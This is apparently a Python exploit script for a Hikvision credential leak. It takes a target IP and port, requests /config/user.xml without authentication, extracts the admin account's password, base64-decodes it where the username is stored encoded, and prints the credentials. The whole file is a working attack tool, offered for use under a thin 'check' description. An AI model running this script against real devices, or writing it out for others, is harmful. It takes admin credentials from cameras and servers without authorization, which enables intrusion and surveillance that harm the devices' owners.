import argparse
import requests
import base64

# hikvision-user-account-credentials-leak
# 创建参数解析器
parser = argparse.ArgumentParser(description='Check user.xml for user information.')

# 添加参数
parser.add_argument('-ip', '--ip', type=str, required=True, help='The IP address of the server')
parser.add_argument('-port', '--port', type=int, required=True, help='The port number')

# 解析命令行参数
args = parser.parse_args()

# 构建URL
url = f"http://{args.ip}:{args.port}/config/user.xml"

# 发送GET请求获取页面内容
response = requests.get(url)

# 检查响应状态码
#print(response.status_code)

if response.status_code == 200:
    # 获取响应文本
    xml_content = response.text

    # 检查是否存在name="admin"
    if 'name="admin"' in xml_content:
        # 如果存在，查找password属性
        start_index = xml_content.find('name="admin"')
        end_index = xml_content.find('>', start_index)
        admin_tag = xml_content[start_index:end_index]
        admin_password_start = admin_tag.find('password="') + len('password="')
        admin_password_end = admin_tag.find('"', admin_password_start)
        admin_password = admin_tag[admin_password_start:admin_password_end]

        # 检查admin的password是否为空
        if admin_password:
            print('true')
            print(f"user: admin, password: {admin_password}")
        else:
            print('false')
            #print("admin的password为空")

    # 检查是否存在name="YWRtaW4="
    if 'name="YWRtaW4="' in xml_content:
        # 如果存在，查找password属性
        start_index = xml_content.find('name="YWRtaW4="')
        end_index = xml_content.find('>', start_index)
        ywrtaw4_tag = xml_content[start_index:end_index]
        ywrtaw4_password_start = ywrtaw4_tag.find('password="') + len('password="')
        ywrtaw4_password_end = ywrtaw4_tag.find('"', ywrtaw4_password_start)
        ywrtaw4_password = ywrtaw4_tag[ywrtaw4_password_start:ywrtaw4_password_end]

        # 检查YWRtaW4=的password是否为空
        if ywrtaw4_password:
            decoded_name = "admin"  # 固定值
            decoded_password = base64.b64decode(ywrtaw4_password).decode('utf-8')
            print('true')
            print(f"user: {decoded_name}, password: {decoded_password}")
        else:
            print('false')
            #print("YWRtaW4=的password为空")

    # 如果既没有admin也没有YWRtaW4=
    if 'name="admin"' not in xml_content and 'name="YWRtaW4="' not in xml_content:
        print('false')
        print("未找到指定的user标签")
else:
    print('false')
    #print(f"无法访问URL，状态码: {response.status_code}")
